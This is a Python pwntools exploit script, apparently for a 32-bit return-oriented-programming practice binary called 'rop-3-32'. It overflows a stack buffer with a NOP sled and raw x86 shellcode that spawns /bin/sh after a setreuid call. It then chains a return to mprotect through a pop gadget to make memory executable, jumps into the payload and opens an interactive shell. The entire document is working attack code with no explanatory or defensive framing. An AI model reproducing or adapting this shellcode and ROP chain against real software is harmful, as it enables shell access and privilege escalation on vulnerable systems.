#!/usr/bin/env python

from pwn import *
import os

SHELLCODE = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'

p = process("./rop-3-32")

mprotect = p32(0x08048360)
pppr = p32(0x080485a8)

#buf = "\x90"*50 + SHELLCODE
#buf += "A"*(0x98 - 50 - len(SHELLCODE)) + "BBBB"
buf = "\x90"*10 + SHELLCODE + "\x90"*10 + ("A" * (0x98 - len(SHELLCODE) - 20)) + "BBBB"

buf += mprotect
#return to the gbuff
buf += pppr
buf += p32(0x804a000)
buf += p32(0x1000)
buf += p32(7)
buf += p32(0x804a060)
#print(buf)

with open("exploit.txt", "wb") as f:
        f.write(buf)

p.sendline(buf)
p.interactive()

